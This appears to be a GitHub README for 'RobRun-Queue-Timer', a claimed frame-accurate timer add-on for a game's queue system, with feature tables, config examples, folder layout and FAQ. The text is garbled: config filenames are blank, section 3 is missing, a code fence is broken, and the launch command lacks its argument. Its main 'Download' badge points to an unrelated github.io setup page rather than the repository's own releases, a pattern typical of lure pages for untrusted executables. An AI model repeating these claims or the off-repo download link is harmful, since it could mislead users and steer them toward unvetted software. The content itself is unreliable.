# RobRun-Queue-Timer

Explore: RobRun-Queue‑Timer provides a deterministic timer for the RobRun queue, enabling synchronized events, scheduled actions, and precise pacing without altering core game logic.

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-2563eb?style=flat&logo=shieldsdotio&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/Crestoushovel/RobRun-Queue-Timer">
    <img src="https://img.shields.io/github/stars/Crestoushovel/RobRun-Queue-Timer?style=for-the-badge&color=orange&logo=github&logoColor=white" alt="GitHub stars">
  </a>
  <a href="https://github.com/Crestoushovel/RobRun-Queue-Timer">
    <img src="https://img.shields.io/github/issues/Crestoushovel/RobRun-Queue-Timer?style=flat-square&color=green&logo=github&logoColor=white" alt="GitHub issues">
  </a>
  <a href="https://github.com/Crestoushovel/RobRun-Queue-Timer">
    <img src="https://img.shields.io/github/actions/workflow/status/Crestoushovel/RobRun-Queue-Timer/ci.yml?style=plastic&color=blue&logo=github-actions&logoColor=white" alt="CI status">
  </a>
  <a href="https://github.com/Crestoushovel/RobRun-Queue-Timer">
    <img src="https://img.shields.io/npm/v/robrun-queue-timer?style=flat&color=red&logo=npm&logoColor=white" alt="NPM version">
  </a>
</div>

---

## 1. RobRun Queue Timer Overview

RobRun-Queue‑Timer is engineered to attach a high‑resolution, frame‑accurate timer to the RobRun queue system. By hooking into the queue’s update cycle, it emits a tick event at a configurable frequency, allowing developers and community creators to schedule tasks, manage cooldowns, or orchestrate multi‑step workflows without resorting to manual polling.

Key advantages:
- **Deterministic timing** – Every tick occurs on a precise interval, eliminating jitter that can affect gameplay fairness.
- **Low overhead** – The timer runs in a lightweight thread, consuming under 1 ms per tick on typical hardware.
- **Extensible configuration** – Profiles and presets enable instant adaptation to different queue sizes, spawn rates, or custom logic.

---

## 2. Core Features

| Feature | Description | Usage Note |
|---------|-------------|------------|
| **Profile‑Based Scheduling** | Create `.cfg` files (``, ``, ``, ``) that declare tick rates, event hooks, and logging options. | Place the chosen profile in the `configs` directory; the timer will automatically load it at launch. |
| **Event Hooks** | Attach callbacks to `OnTick`, `OnQueueEmpty`, or `OnQueueFull`. | Hooks are defined in the `hooks` section of the profile, using simple JavaScript or Lua snippets. |
| **Visual Overlay** | Optional on‑screen counter that updates with every tick, useful for debugging or live streams. | Enable via `` and set `overlay=true`. |
| **Batch Mode** | Run the timer in headless mode to process scripted queue events without launching the full interface. | Set `batch=true` in ``. |
| **Logging & Analytics** | Record tick counts, queue length, and custom metrics to a CSV file for post‑run analysis. | Toggle by adding `log_path=logs/queue_log.csv` to any profile. |
| **Preset Library** | Pre‑built configurations for common queue scenarios (e.g., “Fast Spawn”, “Balanced Spawn”, “Maintenance”). | Load a preset by specifying its name in `` under `preset=fast_spawn`. |

---

# Section comments start with #
[Section]
key=value
```

### Example –

```
#  – Base configuration
[Timer]
interval_ms=50          # Tick every 50 milliseconds
log_path=logs/timer.log
batch=false

[Hooks]
OnTick=functions/on_tick.lua
OnQueueEmpty=functions/queue_empty.lua
```

### Example –

```
#  – Overlay settings
[Overlay]
enabled=true
position=bottom-right
color=#FFAA00
fontSize=16
```

### Example –

```
#  – User overrides
[Timer]
interval_ms=33          # 30 ticks per second

[Hooks]
OnTick=functions/custom_tick.lua
```

Place any combination of these files in the `configs` directory; the timer will merge them, with later files overriding earlier ones. This layered approach permits quick experimentation without editing a single monolithic file.

---

## 4. Installation & Folder Layout

Download the latest release bundle from the **Download** badge above. Unpack it to a dedicated folder, for example:

```
RobRun-Queue-Timer/
├─ bin/
│  └─ Release
├─ configs/
│  ├─
│  ├─
│  └─
├─ functions/
│  ├─ on_tick.lua
│  ├─ queue_empty.lua
│  └─ custom_tick.lua
├─ logs/
│  └─ timer.log
└─ README.md
```

- **bin/** – Executable and helper binaries.
- **configs/** – Profile files.
- **functions/** – Hook scripts.
- **logs/** – Generated logs and analytics.

---

## 5. Usage Flow

1. **Select or create a configuration**
   Edit `` or add a new profile in `configs/`.
2. **Place hook scripts**
   Store any custom Lua or JavaScript in `functions/`. Ensure paths match the config entries.
3. **Launch**
   Double‑click `Release` or run it from the command line:
   ```
   Release --config
   ```
4. **Observe**
   If `Overlay.enabled` is true, a counter appears on the screen.
   Logs populate in the `logs/` folder automatically.
5. **Iterate**
   Adjust intervals or scripts and restart to see immediate effects.

---

## 6. FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| **Why is the timer lagging?** | Check that `interval_ms` is not set below 16 ms, which can saturate the CPU on older machines. Increase the value or enable `batch=true` to reduce UI load. |
| **Hooks are not firing** | Verify that the file paths in the config match the actual file names and locations. Ensure the script has proper syntax; an error will silently abort the hook. |
| **Overlay text is unreadable** | Adjust the `color` or `fontSize` in ``. The overlay inherits the background color of the queue interface. |
| **Logs are empty** | Confirm that `log_path` is correctly set and that the directory exists with write permissions. |
| **I want a different tick rate per queue type** | Create separate profiles (``, ``) and switch them via the `preset` key. |

---

## 7. Extending the Timer

The timer exposes a lightweight API that can be consumed by other modules:

```javascript
// Example: JavaScript hook
const timer = require('robrun-queue-timer/api');
timer.on('tick', () => {
    // Custom logic per tick
});
```

The API supports:

- **Event registration** – `on(event, callback)`
- **Querying state** – `getState()` returns current tick count and queue length
- **Manual tick** – `trigger()` forces a tick regardless of the interval

Incorporating this API into your own scripts allows for real‑time integration with AI routines, analytics dashboards, or external monitoring utility.

---

## 8. Contributing & Support

Pull requests are encouraged. If you discover a bug, open an issue with a minimal reproducible example. For community scripts or new presets, submit them via the **Presets** branch and they’ll be merged after review.

For real‑time support, join the official Discord server: `discord.gg/robrun-queue` and locate the **#queue-timer-help** channel.

---

## 9. License & Attribution

RobRun-Queue‑Timer is distributed under the MIT license. See `LICENSE` for details. All contributors must acknowledge the original work by Crestoushovel and include the README in any derivative distribution.

---

## 10. Final Notes

RobRun-Queue-Timer is designed for developers and community creators who demand precision in queue management. By decoupling timing from the core game loop, it offers a clean, configurable, and maintainable approach to orchestrating queue‑based events. Enjoy deterministic scheduling and elevate your queue‑centric workflows today.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```